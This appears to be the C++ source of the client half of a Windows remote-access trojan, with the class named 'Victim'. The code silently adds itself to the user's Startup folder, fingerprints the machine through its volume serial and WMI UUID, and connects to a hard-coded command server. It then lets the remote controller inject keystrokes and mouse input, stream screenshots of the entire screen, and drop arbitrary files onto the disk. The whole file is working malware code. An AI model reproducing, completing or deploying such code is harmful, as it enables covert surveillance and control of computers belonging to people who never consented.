#include "victim.h"

#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

Victim::Victim()
{    
    hardwareId = getHardwareId();

    //release all keys
    for (int i = 0; i < 256; i++)
        keysStates[i] = false;

    wchar_t buf[256];
    GetModuleFileNameW(NULL, buf, sizeof(buf));
    std::wstring path(buf);
    std::wstring exeName = path.substr(path.find_last_of('\\') + 1);

    //add app to autostart
    PWSTR start;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
        std::wstring lnkPath = std::wstring(start) + L"\\" + exeName + L".lnk";
        //free the allocated memory
        CoTaskMemFree(start);

        //create the link
        if (SUCCEEDED(CoInitialize(NULL))) {
            IShellLink* pShellLink = NULL;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink))) {
                pShellLink->SetPath(path.c_str());
                pShellLink->SetIconLocation(path.c_str(), 0);
                IPersistFile* pPersistFile;
                pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
                pPersistFile->Save(lnkPath.c_str(), TRUE);
                pPersistFile->Release();   
            }
            pShellLink->Release();
        }
        CoUninitialize();
    }

    //connect and initialize connection with server
    connectServer();

    //start the thread that keeps the victim connected
    std::thread keepAwake(&Victim::keepAwake, this);
    keepAwake.detach();
}

int Victim::controlVictim()
{
    while (isRunning) {
        sf::Packet p;
        server.receive(p);

        //if the packet is invalid reconnect with the server
        if (p.getDataSize() == 0) {
            std::cout << "DISCONNECTED FROM SERVER\n";
            isConnected = false, controlMouse = false, controlKeyboard = false, isSharingScreen = false;
            for (int vkc = 0; vkc < 255; vkc++) {
                if (!keysStates[vkc])
                    continue;
                keysStates[vkc] = false;

                //if its a mouse key, treat it accordingly
                if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
            }
            connectServer();
        }

        sf::Uint8 cmd;
        p >> cmd;
        
        //exit program
        if (cmd == 'e') {
            for (int vkc = 0; vkc < 255; vkc++) {
                if (!keysStates[vkc])
                    continue;
                keysStates[vkc] = false;

                //if its a mouse key, treat it accordingly
                if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
            }
            isRunning = false;
        }
        //key pressed-released
        else if (cmd == 'n' || cmd == 'm') {
            sf::Uint8 vkc;
            p >> vkc;

            bool state = (cmd == 'n');
            keysStates[vkc] = state;

            //if its a mouse key, treat it accordingly
            if ((vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06) && controlMouse)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
            else if (controlKeyboard)
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
        }
        //mouse moved
        else if (cmd == 'l') {
            sf::Uint16 a, b;
            p >> a >> b;
            float x = a / (256.f * 256.f) * screenSize.x;
            float y = b / (256.f * 256.f) * screenSize.y;
            if (controlMouse)
                mousePos = Mlib::Vec2i(int(x), int(y));
        }
        //wheel scrolled
        else if (cmd == 'k') {
            sf::Int8 delta;
            p >> delta;
            Mlib::Mouse::simulateScroll(int(delta * 100.f));
        }
        //start/stop controlling keyboard
        else if (cmd == 'a' || cmd == 'z') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i] || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    continue;
                keysStates[i] = false;

                Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }

            if (cmd == 'a')
                controlKeyboard = true;
            else
                controlKeyboard = false;
        }
        //start/stop controlling keyboard
        else if (cmd == 's' || cmd == 'x') {
            for (int i = 0; i < 7; i++) {
                if (!keysStates[i] || !(i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06))
                    continue;
                keysStates[i] = false;

                Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
            }
            if (cmd == 's')
                controlMouse = true;
            else
                controlMouse = false;
        }
        //apparently victim isn't initialized
        else if (cmd == '?') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i])
                    continue;
                keysStates[i] = false;

                //if its a mouse key, treat it accordingly
                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }

            //connect and initialize again
            isConnected = false, controlMouse = false, controlKeyboard = false, isSharingScreen = false;
            connectServer();
        }
        //create new file
        else if (cmd == 'f') {
            //apparently there is another file
            if (file != nullptr) {
                file->close();
                delete file;
                file = nullptr;

                p.clear();
                p << sf::Uint8('h');
                server.send(p);

                continue;
            }

            std::thread newFile(&Victim::createNewFile, this);
            newFile.detach();
        }
        //write file
        else if (cmd == 'o') {
            //file doesnt exist
            if (file == nullptr) {
                p.clear();
                p << sf::Uint8('h');
                server.send(p);

                continue;
            }
            //file isnt good
            else if (file->bad()) {
                file->close();
                delete file;
                file = nullptr;

                p.clear();
                p << sf::Uint8('h');
                server.send(p);

                continue;
            }

            //write data
            const void* buffer = p.getData();
            auto data = static_cast<const char*>(buffer);
            ++data;
            size_t size = p.getDataSize() - 1;
            file->write(data, size);

            //tell controller that it is ready to receive next packet
            p.clear();
            p << sf::Uint8('y');
            server.send(p);
        }
        //close file
        else if (cmd == 'i') {
            //file doesnt exist
            if (file == nullptr) {
                p.clear();
                p << sf::Uint8('h');
                server.send(p);

                continue;
            }
            //file isnt good
            else if (file->bad()) {
                file->close();
                delete file;
                file = nullptr;

                p.clear();
                p << sf::Uint8('h');
                server.send(p);

                continue;
            }

            std::string ext;
            p >> ext;

            file->close();
            delete file;
            file = nullptr;

            //add extention to file
            std::string newName = filePath + ext;
            std::rename(filePath.c_str(), newName.c_str());
        }
        //file fail
        else if (cmd == 'h') {
            if (file == nullptr)
                continue;

            file->close();
            delete file;
            file = nullptr;
        }
        //start screen sharing
        else if (cmd == 'b') {
            isSharingScreen = true;
            p >> sharingRect.first.x >> sharingRect.first.y;
            p >> sharingRect.second.x >> sharingRect.second.y;
        }
        //stop screen sharing
        else if (cmd == 'g') {
            isSharingScreen = false;
        }
    }

    return 0;
}
void Victim::keepAwake()
{
    while (true) {
        //every 2 seconds send a signal to the server so not to be flagged asleep
        if (isConnected && Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
            sf::Packet p;
            p << sf::Uint8('r');
            server.send(p);
            lastAwakeSignal = Mlib::currentTime().asMil();
        }
        //sleep to save computing power
        Mlib::sleep(Mlib::milliseconds(50));
    }
}

void Victim::connectServer()
{
connect:
    //connect to server
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done)
        sf::sleep(sf::seconds(5));

    std::cout << "connected with server\n";

init:
    sf::Packet p;
    //tell server the role and the hardware id
    p << sf::Uint8('v') << VICTIM_PASS << hardwareId;
    server.send(p);

    p.clear();
    if (server.receive(p) == sf::Socket::Disconnected)
        goto connect;

    sf::Uint8 role;
    p >> role;
    //connection approved
    if (role == sf::Uint8('v')) {
        std::cout << "connection with server approved\n";
        isConnected = true;

        std::thread pinMouseTh(&Victim::pinMouse, this);
        pinMouseTh.detach();

        std::thread shareScreemTh(&Victim::shareScreen, this);
        shareScreemTh.detach();
    }
    //this is an old version
    else if (role == sf::Uint8('<')) {
        std::cout << "server rejected the connection because of version mis-match";
        while (true)
            Mlib::sleep(Mlib::seconds(10));
    }
    //unknown error (try endlessly)
    else {
        std::cout << "server rejected the connection for unknown reasons\n";
        Mlib::sleep(Mlib::seconds(5));
        goto init;
    }

}
void Victim::createNewFile()
{
    filePath = Mlib::getSaveFilePath("All Files (*.*)\0*.*\0");
    //failed to retrieve path
    if (filePath == "") {
        sf::Packet p;
        p << sf::Uint8('h');
        server.send(p);
        return;
    }

    std::string loc = filePath.substr(0, filePath.find_last_of('\\'));
    std::string name = filePath.substr(filePath.find_last_of('\\'), filePath.size() - 1);
    name = name.substr(0, name.find_first_of('.'));
    filePath = loc + name;
    //failed to process path
    if (filePath == "") {
        sf::Packet p;
        p << sf::Uint8('h');
        server.send(p);
        return;
    }

    file = new std::ofstream(filePath, std::ios::binary | std::ios::out);
    //failed to create file
    if (file->bad()) {
        sf::Packet p;
        p << sf::Uint8('h');
        server.send(p);
        return;
    }

    //tell controller that it is ready to receive next packet
    sf::Packet p;
    p << sf::Uint8('y');
    server.send(p);
}

void Victim::pinMouse() const
{
    while (isConnected) {
        if (controlMouse) {
            Mlib::Mouse::setPos(mousePos);
            Mlib::sleep(Mlib::milliseconds(1));
        }
        else
            Mlib::sleep(Mlib::milliseconds(300));
    }
}
void Victim::shareScreen()
{
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    const int width = GetDeviceCaps(hScreenDC, HORZRES);
    const int height = GetDeviceCaps(hScreenDC, VERTRES);

    while (isConnected) {
        if (!isSharingScreen) {
            Mlib::sleep(Mlib::milliseconds(300));
            continue;
        }

        // Create a compatible bitmap from the screen DC
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        // Select the new bitmap into the memory DC
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        // Bit block transfer into our compatible memory DC
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

        // Access bitmap bits
        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);

        BITMAPINFOHEADER bi = { 0 };
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = -bmp.bmHeight;  // top-down image
        bi.biPlanes = 1;
        bi.biBitCount = 32;  // we are using a 32-bit bitmap
        bi.biCompression = BI_RGB;

        int bitmapSize = bmp.bmWidth * bmp.bmHeight * 4;  // 4 bytes per pixel for 32-bit bitmap
        BYTE* bitmapData = new BYTE[bitmapSize];
        GetDIBits(hMemoryDC, hBitmap, 0, (UINT)bmp.bmHeight, bitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        char* sendBuffer = new char[1280 * 720];
        for (int y = 0; y < 720; y++) {
            for (int x = 0; x < 1280; x++) {
                int xS = int(x / 1280.f * width); 
                int yS = int(y / 720.f * height);
                int i = (yS * width + xS) * 4;
                sendBuffer[y * 1280 + x] = char((bitmapData[i] + bitmapData[i + 1] + bitmapData[i + 2]) / 3.f);
            }
        }
        
        sf::Packet p;
        p << sf::Uint8('t');
        p.append(sendBuffer, size_t(1280 * 720));
        server.send(p);
        std::cout << "SENT";

        DeleteObject(hBitmap);
        delete[] bitmapData;
        delete[] sendBuffer;

        Mlib::sleep(Mlib::milliseconds(600));
    }

    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

std::string Victim::getHardwareId()
{
    std::string hardwareIdString = "";

    DWORD volumeSerialNumber = 0;
    BOOL result = GetVolumeInformationA("C:\\", 0, 0, &volumeSerialNumber, 0, 0, 0, 0);
    if (result) {
        char serialNumber[9];
        sprintf_s(serialNumber, "%08X", volumeSerialNumber);

        for (int i = 0; i < 8; i++)
            hardwareIdString += serialNumber[i];
    }
    else {
        std::cout << "failed to retrieve volume serial number, error: " << GetLastError();
    }

    HRESULT hres;

    //initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        std::cout << "Failed to initialize COM library. Error code = 0x" << std::hex << hres;
    }

    //set general COM security levels
    hres = CoInitializeSecurity(0, -1, 0, 0, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_NONE, 0);
    if (FAILED(hres)) {
        std::cout << "Failed to initialize security. Error code = 0x" << std::hex << hres;
        CoUninitialize();
    }

    //obtain the initial locator to WMI
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        std::cout << "Failed to create IWbemLocator object. Error code = 0x" << std::hex << hres;
        CoUninitialize();
    }

    //connect to WMI through the IWbemLocator::ConnectServer method
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), 0, 0, 0, 0, 0, 0, &pSvc);
    if (FAILED(hres)) {
        std::cout << "Could not connect. Error code = 0x" << std::hex << hres;
        pLoc->Release();
        CoUninitialize();
    }

    //set security levels on the proxy
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, 0,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_NONE);
    if (FAILED(hres)) {
        std::cout << "Could not set proxy blanket. Error code = 0x" << std::hex << hres;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

    //use the IWbemServices pointer to make requests of WMI
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT UUID FROM Win32_ComputerSystemProduct"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 0, &pEnumerator);
    if (FAILED(hres)) {
        std::cout << "Query for UUID failed. Error code = 0x" << std::hex << hres;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

    //get the data from the query
    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;
    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
        if (uReturn == 0)
            break;

        //get the value of the UUID property
        VARIANT vtProp;
        VariantInit(&vtProp);
        hr = pclsObj->Get(L"UUID", 0, &vtProp, 0, 0);
        std::wstring ws(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
        std::string uuid(ws.begin(), ws.end());

        VariantClear(&vtProp);
        pclsObj->Release();

        uuid.erase(std::remove(uuid.begin(), uuid.end(), '-'), uuid.end());
        hardwareIdString += uuid;
    }

    pSvc->Release();
    pLoc->Release();
    pEnumerator->Release();
    CoUninitialize();

    return hardwareIdString;
}
